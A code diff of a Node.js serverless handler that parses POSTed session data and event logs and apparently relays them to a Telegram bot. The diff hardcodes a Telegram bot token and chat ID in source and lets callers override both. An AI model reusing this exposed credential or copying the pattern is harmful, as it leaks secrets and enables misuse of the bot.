@@ -15,7 +15,8 @@ if (!admin.apps.length) {
 }
 
 const db = admin.firestore();
-const BOT_TOKEN = "8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE";
+const BOT_TOKEN_ENTRANCE = "8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE";
+const BOT_TOKEN_EXIT = "8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE"; // 2nd Bot Token
 const CHAT_ID = "6886010817";
 
 module.exports = async (req, res) => {
@@ -28,17 +29,23 @@ module.exports = async (req, res) => {
     if (req.method === 'OPTIONS') return res.status(200).end();
     if (req.method !== 'POST') return res.status(200).send('OK');
 
-    // --- ROBUST BODY PARSING (V39 Mixed Format Support) ---
-    let data = req.body;
+    // --- ULTRA-ROBUST BODY PARSING (V40) ---
+    let data = {};
+    const rawBody = req.body;
 
-    // Handle URLSearchParams / Form-Data automatically if possible, otherwise manual parse
-    if (typeof data === 'object' && !Buffer.isBuffer(data)) {
-        // Body is already an object (JSON or parsed form)
-    } else if (Buffer.isBuffer(data)) {
-        try { data = JSON.parse(data.toString()); } catch (e) { }
-    } else if (typeof data === 'string') {
-        try { data = JSON.parse(data); } catch (e) { }
-    }
+    try {
+        if (typeof rawBody === 'object' && !Buffer.isBuffer(rawBody)) {
+            data = rawBody;
+        } else {
+            const bodyStr = Buffer.isBuffer(rawBody) ? rawBody.toString() : String(rawBody);
+            if (bodyStr.trim().startsWith('{')) {
+                data = JSON.parse(bodyStr);
+            } else if (bodyStr.includes('=')) {
+                const params = new URLSearchParams(bodyStr);
+                params.forEach((v, k) => { data[k] = v; });
+            }
+        }
+    } catch (e) { console.warn("Parse warning:", e.message); }
 
     const {
         sessionID,
@@ -50,11 +57,14 @@ module.exports = async (req, res) => {
         eventLog,
         botToken,
         chatId
-    } = data || {};
+    } = data;
 
-    if (!sessionID) return res.status(400).send('Missing Session ID');
+    if (!sessionID) {
+        console.error("400: Missing Session ID. Body type:", typeof rawBody);
+        return res.status(400).send('Missing Session ID');
+    }
 
-    const finalBotToken = botToken || BOT_TOKEN;
+    const finalBotToken = botToken || BOT_TOKEN_EXIT;
     const finalChatId = chatId || CHAT_ID;
 
     try {
